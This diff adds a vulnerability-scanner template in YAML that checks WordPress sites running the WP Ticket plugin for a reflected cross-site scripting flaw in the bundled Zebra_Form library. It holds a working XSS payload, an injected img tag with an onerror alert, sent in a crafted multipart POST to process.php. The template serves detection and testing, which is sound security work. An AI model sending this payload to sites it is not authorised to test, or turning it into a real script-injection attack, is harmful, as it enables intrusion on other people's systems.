@@ -1,0 +1,52 @@
+id: wordpress-zebra-form-xss
+brief:
+    title: Zebra_Form PHP Library <= 2.9.8 - Cross-Site Scripting
+    by: madrobot
+    level: medium
+    about: Zebra_Form PHP library 2.9.8 and prior (which is used by some WordPress plugins) is affected by reflected cross-site scripting vulnerabilities via process.php.
+    label:
+        - wordpress
+        - xss
+        - wp
+        - wpscan
+        - intrusive
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/wp-ticket/readme.txt'
+      signs:
+        - "on": word
+          has:
+            - WP Ticket
+            - 'Tags:'
+          in: body
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(document.domain)%3E&control=upload'
+      head:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Content-Type: multipart/form-data; boundary=---------------------------77916619616724262872902741074
+        Origin: "null"
+      body: |-
+        -----------------------------77916619616724262872902741074
+        Content-Disposition: form-data; name="upload"; filename="{{randstr}}.txt"
+        Content-Type: text/plain
+        Test
+        -----------------------------77916619616724262872902741074--
+      signs:
+        - "on": word
+          has:
+            - </script><img src onerror=alert(document.domain)>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
